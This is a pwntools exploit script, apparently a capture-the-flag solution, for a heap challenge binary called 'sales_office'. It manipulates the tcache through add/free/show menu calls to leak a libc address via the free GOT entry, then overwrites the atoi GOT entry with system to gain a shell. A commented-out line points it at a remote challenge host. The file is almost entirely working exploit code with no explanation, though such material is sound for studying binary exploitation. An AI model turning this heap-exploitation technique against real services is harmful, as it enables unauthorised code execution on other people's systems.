from pwn import *
context.log_level = 'debug'
prog = './sales_office'
elf = ELF(prog)
p = process(prog)
#,env={"LD_PRELOAD":"./libc.so.6"})
'''
patchelf --set-interpreter /home/luckyu/Desktop/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/ld-2.27.so
patchelf --set-rpath /home/luckyu/Desktop/glibc-all-in-one/libs/2.27-3ubuntu1_amd64
patchelf --set-interpreter /home/luckyu/Desktop/glibc-all-in-one/libs/2.29-0ubuntu2_amd64/ld-2.29.so
patchelf --set-rpath /home/luckyu/Desktop/glibc-all-in-one/libs/2.29-0ubuntu2_amd64
'''
libc = ELF("./libc.so")
#p = remote("183.129.189.60", 10008)
def debug(addr,PIE=True): 
	if PIE: 
		text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16) 
		gdb.attach(p,'b *{}'.format(hex(text_base+addr))) 
	else: gdb.attach(p,"b *{}".format(hex(addr)))
def dbg(b= ''):
    gdb.attach(p, b)
    if b == '':
    	p.interactive()
    	
def add(size, content = 'a'):
	p.sendlineafter("choice:", '1')
	p.sendlineafter("our house:\n", str(size))
	if size <= 0x60:
		p.sendafter("decorate your house:\n", content)
def show(idx):
	p.sendlineafter("choice:", '3')
	p.sendlineafter("index:\n", str(idx))
def free(idx):
	p.sendlineafter("choice:", '4')
	p.sendlineafter("index:\n", str(idx))
def exp():
	for i in range(3):
		add(0x60)
	for i in range(3):
		free(i)
	add(0x70)
	add(0x10, p64(elf.got['free']))
	show(0)
	p.recvuntil("house:\n")
	libc.address = u64(p.recvuntil("\x0a", drop=True).ljust(8, '\x00'))-0x7f0bda91e1d0+0x7f0bda885000
	log.info("libc.address ==> " + hex(libc.address))
	for i in range(4):
		add(0x10)
	add(0x70)
	for i in range(4, 7):
		free(i)
	
	free(8)
	free(1)
	free(7)
	free(2)
	for i in range(3):
		add(0x10)
	add(0x80)
	add(0x10, p64(elf.got['atoi']))
	add(0x10)
	add(0x10, p64(libc.sym['system']))
	dbg()
	p.interactive()
if __name__ == '__main__':
	exp()